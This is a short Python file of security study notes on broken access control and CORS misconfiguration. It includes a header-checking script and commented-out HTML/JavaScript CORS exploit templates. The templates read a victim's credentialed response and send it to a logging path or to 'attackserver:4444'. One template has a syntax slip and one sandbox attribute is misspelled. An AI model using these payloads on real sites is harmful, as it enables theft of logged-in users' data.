# Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification or destruction of all data, or performing a business function outside of the limits of the user. Common access control vulnerabilities include:

# Bypassing access control checks by modifying the URL, internal application state, or the HTML page, or simply using a custom API attack tool
# Allowing the primary key to be changed to another's users record, permitting viewing or editing someone else's account.
# Elevation of privilege. Acting as a user without being logged in, or acting as an admin when logged in as a user.
# Metadata manipulation, such as replaying or tampering with a JSON Web Token (JWT) access control token or a cookie or hidden field manipulated to elevate privileges, or abusing JWT invalidation
# CORS misconfiguration allows unauthorized API access.
# Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user. Accessing API with missing access controls for POST, PUT and DELETE.

#CORS(Cross Origin Resource Sharing) Misconfig Automation
import requests as r
response = r.get('https://api.github.com')
print(response)
print('----')
print(response.headers)

ACAO = response.headers.get('Access-Control-Allow-Origin')
ACAC = response.headers.get('Access-Control-Allow-Credentials')
TACO = response.headers.get('Totally-Actionable-Cody-Object')

print(ACAO)
print(ACAC)
print(TACO)

# CORS Vulnerability Exploit scripts
#
# Access-Control-Allow-Origin: <reflected value>
# Access-Control-Allow-Credentials true
# <html>
#     <body>
#         <h1>Hello Vorld!</h1>
#         <script>
#             var xhr = new XMLHttpRequest();
#             var url = 'https://vulnerablesite.com'
#             xhr.onreadystatechange = function(){
#                 if(xhr.readyState == XMLHttpRequest.DONE){
#                     fetch('/log?key='' + xhr.responseText);
#                 }
#             }
#             xhr.open('GET', url + '/pathToHit', true);
#             xhr.withCredentials = true;
#             xhr.send(null)
#         </script>
#     </body>
# </html>

#
# Access-Control-Allow-Origin: null
# Access-Control-Allow-Credentials true
# <html>
#     <body>
#         <h1>Hello Vorld!</h1>
#         <iframe style="display: none;" sandbox="allow-scirpts" srcdoc="
#         <script>
#             var xhr = new XMLHttpRequest();
#             var url = 'https://vulnerablesite.com'
#             xhr.onreadystatechange = function(){
#                 if(xhr.readyState == XMLHttpRequest.DONE){
#                     fetch('http://attackserver:4444/log?key=' + xhr.responseText);
#                 }
#             }
#             xhr.open('GET', url + '/pathToHit', true);
#             xhr.withCredentials = true;
#             xhr.send(null)
#         </script>"></iframe>
#     </body>
# </html>

# Access-Control-Allow-Origin: <reflected value>